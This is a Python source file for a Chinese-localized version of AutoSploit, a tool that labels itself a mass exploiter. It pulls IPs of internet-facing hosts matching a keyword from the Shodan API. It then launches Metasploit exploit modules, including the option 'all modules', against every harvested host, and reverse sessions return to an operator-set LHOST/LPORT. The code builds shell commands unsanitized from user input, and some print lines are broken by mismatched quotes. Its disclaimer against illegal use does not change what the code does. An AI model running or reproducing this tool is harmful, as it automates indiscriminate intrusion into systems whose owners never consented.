#!/usr/bin/env python
# -*- coding:utf-8

import os
import sys
import pickle
import time

from subprocess import PIPE, Popen

import shodan
from blessings import Terminal

t = Terminal()

# Global vars
api = ""
query = ""
workspace = ""
local_port = ""
local_host = ""
configured = False
toolbar_width = 60


# Logo
def logo():
    print ("""
                              _____     _       _____     _     _ _   
#--Author : Vector/NullArray |  _  |_ _| |_ ___|   __|___| |___|_| |_ 
#--Twitter: @Real__Vector    |     | | |  _| . |__   | . | | . | |  _|
#--Type   : Mass Exploiter   |__|__|___|_| |___|_____|  _|_|___|_|_|  
#--Version: 1.0.0                                    |_| 
#--汉化    :CoolCat                                              
##############################################
""")


# Usage and legal.
def usage():
    os.system("clear")
    logo()
    print """
+-----------------------------------------------------------------------+
|                    AutoSploit的常见用法以及相关信息                   |
+-----------------------------------------------------------------------+

    正如AutoSploit这个名字一样，本工具是用于进行进行全自动化的渗透测试      
工具通过Shodan的API接口来采集设备，调用本地的MetaSploit来完成自动渗透。      
                                                                       
   进入"主机采集"功能后可输入一个关键词如“apache”或者“IIS”,程序会根据
关键词在Shodan采集主机ip并保存到host.txt文件,完成采集后选择“开始攻击”
模块，工具会调用Metasploit的模块对主机进行攻击测试.
                                                                       
   在选择“开始攻击”后，工具会要求设置任务名称, 本地主机，本地端口,即MSF
反弹会话到的主机信息，设置完成攻击就正式开始了                              
                                                                       
                                                                       
+------------------+----------------------------------------------------+
|   功能选项        |                   功能说明                        |
+------------------+----------------------------------------------------+
|1. 使用帮助        | 展示本页帮助信息。                                |
|2. 采集主机        | 调用Shodan接口采集关键词的主机ip                  |
|3. 采集主机        | 打印出已采集的主机列表                            |
|4. 开始攻击        | 配置任务并开始攻击                                |
|5. 退出程序        | 退出AutoSploit.                                   |
+------------------+----------------------------------------------------+
|                         免责声明                              |
+-----------------------------------------------------------------------+
|程序仅供技术交流使用，请勿非法使用！                                   |
|一切非法使用造成的后果于本人无关！                                     |
+-----------------------------------------------------------------------+
"""


# Function that allows us to store system command
# output in a variable
def cmdline(command):
    process = Popen(
        args=command,
        stdout=PIPE,
        shell=True
    )
    return process.communicate()[0]

def note():
	print u"[+]使用指定的或者全部MSF模块进行攻击? [S]指定模块/[A]全部模块: "


def exploit(query):
    global workspace
    global local_port
    global local_host

    os.system("clear")
    logo()

    sorted_modules = []
    all_modules = []

    print "[" + t.green("+") + u"]指定攻击模块。"
    print "[" + t.green("+") + u"]请稍等...\n\n\n"

    # Progress bar
    sys.stdout.write("[%s]" % (" " * toolbar_width))
    sys.stdout.flush()
    sys.stdout.write("\b" * (toolbar_width + 1))

    with open("modules.txt", "rb") as infile:
        for i in xrange(toolbar_width):
            time.sleep(0.1)
            for lines in infile:
                all_modules.append(lines)
                if query in lines:
                    sorted_modules.append(lines)

            # update the bar
            sys.stdout.write('\033[94m' + "|" + '\033[0m')
            sys.stdout.flush()

    print "\n\n\n[" + t.green("+") + u"]正在整理MSF相关搜索模块.\n"
    # Print out the sorted modules
    for line in sorted_modules:
        print "[" + t.cyan("-") + "]" + line

    # We'll give the user the option to run all modules in a 'hail mary' type of attack or allow
    # a more directed approach with the sorted modules.
    note()
    choice = raw_input("\n[" + t.magenta("?") + u"][S]/[A]").lower()

    if choice == 's':
        with open("hosts.txt", "rb") as host_list:
            for rhosts in host_list:
                for exploit in sorted_modules:
                    template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
                    workspace, local_host, local_port, rhosts, exploit)
                    os.system(template)
    elif choice == 'a':
        with open("hosts.txt", "rb") as host_list:
            for rhosts in host_list:
                for exploit in all_modules:
                    template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
                    workspace, local_host, local_port, rhosts, exploit)
                    os.system(template)
    else:
        print "[" + t.red("!") + u"]没有该选项，已返回上级菜单。"


# Function to gather target hosts from Shodan 
def targets(clobber=True):
    global query

    os.system("clear")
    logo()

    print "[" + t.green("+") + u"]请输入在Shodan采集主机的关键词。"
    print "[" + t.green("+") + u"]比如，输入“IIS”将采集所有IIS服务器的IP列表。"

    while True:
        query = raw_input("\n<" + t.cyan("PLATFORM") + ">$ ")

        if query == "":
            print "[" + t.red("!") + u"]输入的关键词不能为空."
        else:
            break

    print "[" + t.green("+") + u"]正在采集主机，请稍等...\n\n\n"
    time.sleep(1)

    try:
        result = api.search(query)
    except Exception as e:
        print "\n[" + t.red("!") + u"]发生一个未知错误，错误提示如下：\n"
        print e

        sys.exit(0)

    # Setup progress bar
    sys.stdout.write("[%s]" % (" " * toolbar_width))
    sys.stdout.flush()
    sys.stdout.write("\b" * (toolbar_width + 1))

    if clobber == True:
        with open('hosts.txt', 'wb') as log:
            for i in xrange(toolbar_width):
                time.sleep(0.1)
                for service in result['matches']:
                    log.write(service['ip_str'])
                    log.write("\n")

                # update the bar
                sys.stdout.write('\033[94m' + "|" + '\033[0m')
                sys.stdout.flush()

        hostpath = os.path.abspath("hosts.txt")

        print "\n\n\n[" + t.green("+") + u"]完成。"
        print "[" + t.green("+") + u"]主机IP列表已保存至： " + hostpath

    else:
        with open("hosts.txt", "ab") as log:
            for i in xrange(toolbar_width):
                time.sleep(0.1)
                for service in result['matches']:
                    log.write(service['ip_str'])
                    log.write("\n")

        # update the bar
        sys.stdout.write('\033[94m' + "|" + '\033[0m')
        sys.stdout.flush()

        hostpath = os.path.abspath("hosts.txt")

        print "\n\n\n[" + t.green("+") + u"]完成。"
        print "[" + t.green("+") + u"]已添加到主机中： " + hostpath


# Function to define metasploit settings
def settings():
    global workspace
    global local_port
    global local_host
    global configured

    os.system("clear")
    logo()

    print "[" + t.green("+") + u"]MSF配置\n"
    print u"攻击之前的相关配置"
    time.sleep(1.5)

    print "\n[" + t.green("+") + u"]注意：\n"
    print u"请确保您的网络配置正确。\n"
    print u"为确保MSF会话能顺利连接到您的电脑，"
    print u"攻击外网主机最好在VPS上进行..."
    time.sleep(1.5)

    workspace = raw_input("\n[" + t.magenta("?") + u"]workname: ")
    if not workspace == "":
        print "[" + t.green("+") + u"]本次任务为: " + workspace
    else:
        workspace = False

    local_host = raw_input("\n[" + t.magenta("?") + u"]LHOST: ")
    if not local_host == "":
        print "[" + t.green("+") + u"]接受MSF会话的主机为（LHOST）: " + repr(local_host)
    else:
        local_host = False

    local_port = raw_input("\n[" + t.magenta("?") + u"]LPORT: ")
    if not local_host == "":
        print "[" + t.green("+") + u"]主机端口为（LPORT）：" + repr(local_port)
    else:
        local_port = False

    # Check if settings are not null
    if workspace == False or local_host == False or local_port == False:
        configured = None
        print "\n[" + t.red("!") + u"]注意！LPORT, LHOST 以及任务名称不能为空！"
        print "[" + t.green("+") + u"]重启MSF模块"
        time.sleep(1.5)
    else:
        # If everything has been properly configured we're setting config var to true
        # When we return to the main menu loop we will use it to check to see if we
        # can skip the config stage. When the exploit component is run a second time
        configured = True

        if not os.path.isfile("hosts.txt"):
            print "[" + t.red("!") + u"]注意：未能检测到host.txt里的主机，请检查关键词或文件读写权限。"
            print u"必须得有主机才能继续攻击。"
        else:
            # Call exploit function, the 'query' argument contains the search strig provided
            # in the 'gather hosts' function. We will check this string against the MSF
            # modules in order to sort out the most relevant ones with regards to the intended
            # targets.
            exploit(query)


# Main menu
def fuck():
	print "[?]将主机IP追加(a)或者重写(o)进Hosts.txt文件?"



def main():
    global query
    global configured
    global api

    try:
        api = shodan.Shodan(SHODAN_API_KEY)
    except Exception as e:
        print "\n[" + t.red("!") + u"]API连接失败，请检查api密钥是否正确！\n"
        print e
        sys.exit(0)

    try:
        while True:
            # Make sure a misconfiguration in the MSF settings
            # Doesn't execute main menu loop but returns us to the
            # appropriate function for handling those settings
            if configured == None:
                settings()

            print "\n[" + t.green("+") + "]" + u"欢迎使用AutoSploit，请选择:"
            print """
		
1. 使用帮助		3. 查看主机		5. 退出
2. 采集主机		4. 开始攻击
									"""

            action = raw_input("\n<" + t.cyan("AUTOSPLOIT") + ">$ ")

            if action == '1':
                usage()

            elif action == '2':
                if not os.path.isfile("hosts.txt"):
                    targets(True)
                else:
                    fuck()
                    append = raw_input("\n[" + t.magenta("?") + "]" + u" [A/O]: ").lower()

                    if append == 'a':
                        targets(False)
                    elif append == 'o':
                        targets(True)
                    else:
                        print "\n[" + t.red("!") + u"]无该选项"

            elif action == '3':
                if not os.path.isfile("hosts.txt"):
                    print "\n[" + t.red("!") + u"]警告：未检测到hosts.txt文件的内容！"

                else:
                    print "[" + t.green("+") + u"]正在打印主机...\n\n"
                    time.sleep(2)

                    with open("hosts.txt", "rb") as infile:
                        for line in infile:
                            print "[" + t.cyan("-") + "]" + line

                    print "[" + t.green("+") + u"]完成。\n"

            elif action == '4':
                if not os.path.isfile("hosts.txt"):
                    print "\n[" + t.red("!") + u"]警告：未检测到hosts.txt文件的内容！"
                    print u"在开始攻击之前请"
                    print u"1.检查关键词是否正确以及是否能搜索到主机"
                    print u"2.重新采集主机"
                

                if configured == True:
                    exploit(query)
                elif configured == False:
                    settings()

            elif action == '5':
                print "\n[" + t.red("!") + "]" + u"正在退出AutoSploit..."
                break

            else:
                print "\n[" + t.red("!") + u"]无该选项"

    except KeyboardInterrupt:
        print "\n[" + t.red("!") + u"]已终止运行。"
        sys.exit(0)


if __name__ == "__main__":
    logo()

    print "[" + t.green("+") + "]" + u"初始化autosploit..."
    print "[" + t.green("+") + "]" + u"正在检查PostgreSQL和Apache服务，请稍等...\n"

    postgresql = cmdline("sudo service postgresql status | grep active")
    if "Active: inactive" in postgresql:
        print "\n[" + t.red("!") + "]“ + u”Postgresql未启动！"

        start_pst = raw_input("\n[" + t.magenta("?") + "]“ + u”是否启动Postgresql服务? [Y]是/[N]否: ").lower()
        if start_pst == 'y':
            os.system("sudo service postgresql start")

            print "[" + t.green("+") + u"]Postgresql服务已启动..."
            time.sleep(1.5)

        elif start_pst == 'n':
            print "\n[" + t.red("!") + "]“ + u”AutoSploit的攻击要求MSF的相关服务均为开启状态."
            print "[" + t.red("!") + u"]终止。"
            time.sleep(1.5)
            sys.exit(0)
        else:
            print "\n[" + t.red("!") + "]“ + u”无该选项，已使用默认选项。"
            os.system("sudo service postgresql start")

            print "[" + t.green("+") + "]“ + u”Postgresql服务已启动..."
            time.sleep(1.5)

    apache = cmdline("service apache2 status | grep active")
    if "Active: inactive" in apache:
        print "\n[" + t.red("!") + u"]警告：Apache服务未启动"

        start_ap = raw_input("\n[" + t.magenta("?") + "]“ + u”开启Apache服务? [Y]是/[N]否: ").lower()
        if start_ap == 'y':
            os.system("sudo service apache2 start")

            print "[" + t.green("+") + u"]Apache已启动..."
            time.sleep(1.5)

        elif start_ap == 'n':
            print "\n[" + t.red("!") + "]“ + u”AutoSploit的攻击要求MSF的相关服务均为开启状态."
            print "[" + t.red("!") + u"]终止。"
            time.sleep(1.5)
            sys.exit(0)
        else:
            print "\n[" + t.red("!") + "]“ + u”无该选项，已使用默认选项。"
            os.system("sudo service apache2 start")

            print "[" + t.green("+") + u"]Apache服务已启动..."
            time.sleep(1.5)

    # We will check if the shodan api key has been saved before, if not we are going to prompt
    # for it and save it to a file
    if not os.path.isfile("api.p"):
        print "\n[" + t.green("+") + u"]请输入你在Shodan的API密匙"

        SHODAN_API_KEY = raw_input("API密匙: ")
        pickle.dump(SHODAN_API_KEY, open("api.p", "wb"))

        path = os.path.abspath("api.p")
        print "[" + t.green("+") + u"]\n你的API密匙已保存到： " + path

        main()
    else:
        try:
            SHODAN_API_KEY = pickle.load(open("api.p", "rb"))
        except IOError as e:
            print "\n[" + t.red("!") + u"]读取API密匙时引发了IO错误。"
            print e

        path = os.path.abspath("api.p")
        print "\n[" + t.green("+") + u"]已加载API密匙：" + path

        main()
